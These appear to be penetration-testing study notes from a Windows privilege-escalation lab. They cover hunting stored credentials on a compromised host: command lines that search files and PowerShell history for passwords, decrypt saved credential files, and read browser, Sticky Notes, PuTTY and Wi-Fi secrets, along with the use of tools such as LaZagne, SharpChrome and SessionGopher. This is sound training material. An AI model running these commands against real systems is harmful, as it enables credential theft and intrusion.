	
#### Searching for Files

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.
	
#### Chrome Dictionary Files

```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```


---


## Unattended Installation Files

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.



## PowerShell History File

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Confirming PowerShell History Save Path

```
(Get-PSReadLineOption).HistorySavePath
```

#### Reading PowerShell History File

```
gc (Get-PSReadLineOption).HistorySavePath
```

We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user.

```
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```


---


## PowerShell Credentials

The point of this module is almost certainly: **if you compromise a host and find a `.xml` file like `pass.xml`, and you're running as the same user (or SYSTEM/admin can impersonate that user's DPAPI keys), you can decrypt it and get the plaintext password.**

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```
$credential.GetNetworkCredential().username
```

```
$credential.GetNetworkCredential().password
```


#### Search File Contents for String

```
findstr /si password *.xml *.ini *.txt *.config
```

```
findstr /spin "password" *.*
```


#### Search File Contents with PowerShell

```
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

```
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

```
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "\bpassword\b"
```

---

```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

```
where /R C:\ *.config
```


---


## Sticky Notes Passwords

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.


### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.

```
Set-ExecutionPolicy Bypass -Scope Process
```

```
cd .\PSSQLite\
```

```
Import-Module .\PSSQLite.psd1
```

```
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

```
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

 

---


## Cmdkey Saved Credentials

#### Listing Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password.

```
cmdkey /list
```

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

#### Run Commands as Another User

```
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

```
runas /netonly /user:DOMAIN\Username cmd.exe
```

---


## Browser Credentials

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```
.\SharpChrome.exe logins /unprotect
```


---


## Password Managers

If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password.

#### Extracting KeePass Hash

First, we extract the hash in Hashcat format using the `keepass2john.py` script.

```
keepass2john ILFREIGHT_Help_Desk.kdbx 
```

#### Cracking Hash Offline

We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass.


---


## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

---

## More Fun with Credentials

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms.


```
.\lazagne.exe all
```


___


## Even More Fun with Credentials

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.

#### Running SessionGopher as Current User

We need **LOCAL ADMIN** access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.

```
Import-Module .\SessionGopher.ps1
```

```
Invoke-SessionGopher -Target WINLPE-SRV01
```



___

### Enumerating Autologon with reg.exe

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```


___


### Putty

For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

#### Enumerating Sessions and Finding Credentials:

First, we need to enumerate the available saved sessions:

```
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

```
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```




___


## Wifi Passwords

#### Viewing Saved Wireless Networks

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

```
netsh wlan show profile
```

#### Retrieving Saved Wireless Passwords

```
netsh wlan show profile ilfreight_corp key=clear
```

